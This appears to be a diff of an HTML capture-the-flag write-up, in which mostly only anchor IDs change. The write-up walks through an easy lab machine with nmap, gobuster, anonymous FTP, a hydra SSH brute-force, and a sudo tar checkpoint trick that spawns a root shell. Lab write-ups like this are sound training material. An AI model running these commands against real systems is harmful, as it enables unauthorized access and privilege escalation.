@@ -22,12 +22,12 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgd6ae5d8">Recon</a></li>
-<li><a href="#orgbc5c9b0">The Website</a></li>
-<li><a href="#org8021196">The FTP server</a></li>
-<li><a href="#orgfb3d875">The SSH server</a></li>
-<li><a href="#org7134eea">Privilege Escalation</a></li>
-<li><a href="#org925caf7">Conclusion</a></li>
+<li><a href="#orgb2bdeb5">Recon</a></li>
+<li><a href="#orga37ebe5">The Website</a></li>
+<li><a href="#orged7acd7">The FTP server</a></li>
+<li><a href="#orgba766ac">The SSH server</a></li>
+<li><a href="#org7fecc73">Privilege Escalation</a></li>
+<li><a href="#org8e5a446">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -49,14 +49,14 @@ on a medium difficulty room instead of an easy one would be better)!
 </p>
 
 
-<div id="outline-container-orgd6ae5d8" class="outline-2">
-<h2 id="orgd6ae5d8"><a href="#orgd6ae5d8">Recon</a></h2>
-<div class="outline-text-2" id="text-orgd6ae5d8">
+<div id="outline-container-orgb2bdeb5" class="outline-2">
+<h2 id="orgb2bdeb5"><a href="#orgb2bdeb5">Recon</a></h2>
+<div class="outline-text-2" id="text-orgb2bdeb5">
 <p>
 Like always: a quick <code>nmap</code> scan
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org7a83b04"><span class="org-variable-name">IP</span>=10.10.61.63
+<pre class="src src-bash" id="orgadd93eb"><span class="org-variable-name">IP</span>=10.10.61.63
 nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 </pre>
 </div>
@@ -76,15 +76,15 @@ missed anything, we visit the website.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orgdfb3612">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="org5b3a204">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-orgbc5c9b0" class="outline-2">
-<h2 id="orgbc5c9b0"><a href="#orgbc5c9b0">The Website</a></h2>
-<div class="outline-text-2" id="text-orgbc5c9b0">
+<div id="outline-container-orga37ebe5" class="outline-2">
+<h2 id="orga37ebe5"><a href="#orga37ebe5">The Website</a></h2>
+<div class="outline-text-2" id="text-orga37ebe5">
 <p>
 First things first, after visiting the website it looks like its a
 simple static website, comprised of just one html page, in which
@@ -96,16 +96,16 @@ getting into the target system to us. Nothing is hidden in the html.
 Gobuster also did not reveal any promising files.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orge072694">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
+<pre class="src src-bash" id="org9613da3">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
 </pre>
 </div>
 </div>
 </div>
 
 
-<div id="outline-container-org8021196" class="outline-2">
-<h2 id="org8021196"><a href="#org8021196">The FTP server</a></h2>
-<div class="outline-text-2" id="text-org8021196">
+<div id="outline-container-orged7acd7" class="outline-2">
+<h2 id="orged7acd7"><a href="#orged7acd7">The FTP server</a></h2>
+<div class="outline-text-2" id="text-orged7acd7">
 <p>
 Using the standard command we can visit the ftp server as <code>anonymous</code>.
 </p>
@@ -113,7 +113,7 @@ Using the standard command we can visit the ftp server as <code>anonymous</code>
 <p>
 If performing any commands returns:
 </p>
-<pre class="example" id="org7e5c80c">
+<pre class="example" id="org02330ec">
 530 Please login with USER and PASS.
 </pre>
 <p>
@@ -134,15 +134,15 @@ small <i>flag</i></li>
 </div>
 </div>
 
-<div id="outline-container-orgfb3d875" class="outline-2">
-<h2 id="orgfb3d875"><a href="#orgfb3d875">The SSH server</a></h2>
-<div class="outline-text-2" id="text-orgfb3d875">
+<div id="outline-container-orgba766ac" class="outline-2">
+<h2 id="orgba766ac"><a href="#orgba766ac">The SSH server</a></h2>
+<div class="outline-text-2" id="text-orgba766ac">
 <p>
 Trying our luck with the wordlist found above, eventually gives us the
 password for the user <code>lin</code>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org12afc4b">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
+<pre class="src src-bash" id="org17cf60f">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
 </pre>
 </div>
 
@@ -154,9 +154,9 @@ machine, and by visiting lin&rsquo;s Desktop, we get the first actual flag.
 </div>
 
 
-<div id="outline-container-org7134eea" class="outline-2">
-<h2 id="org7134eea"><a href="#org7134eea">Privilege Escalation</a></h2>
-<div class="outline-text-2" id="text-org7134eea">
+<div id="outline-container-org7fecc73" class="outline-2">
+<h2 id="org7fecc73"><a href="#org7fecc73">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-org7fecc73">
 <p>
 Just running <code>sudo -l</code> shows that we can run <code>/bin/tar</code> as root.
 </p>
@@ -167,16 +167,16 @@ privileges in no time:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org093d46e">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
+<pre class="src src-bash" id="org773d48d">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
 </pre>
 </div>
 </div>
 </div>
 
 
-<div id="outline-container-org925caf7" class="outline-2">
-<h2 id="org925caf7"><a href="#org925caf7">Conclusion</a></h2>
-<div class="outline-text-2" id="text-org925caf7">
+<div id="outline-container-org8e5a446" class="outline-2">
+<h2 id="org8e5a446"><a href="#org8e5a446">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org8e5a446">
 <p>
 It was a nice room, arguably a wrong choice for me, but a good place
 to start I suppose, covering a little bit of the basics. 
